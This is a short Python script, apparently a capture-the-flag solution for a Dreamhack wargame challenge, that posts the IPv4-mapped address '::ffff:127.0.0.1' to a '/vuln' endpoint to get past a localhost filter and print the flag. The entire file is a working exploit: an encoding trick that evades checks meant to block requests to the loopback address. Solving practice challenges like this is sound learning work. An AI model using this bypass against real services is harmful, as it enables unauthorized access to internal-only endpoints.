import requests

url = 'http://host3.dreamhack.games:13316/vuln'

data = {'vulntest': '::ffff:127.0.0.1'}

flag = requests.post(url,data=data)

print(flag.text)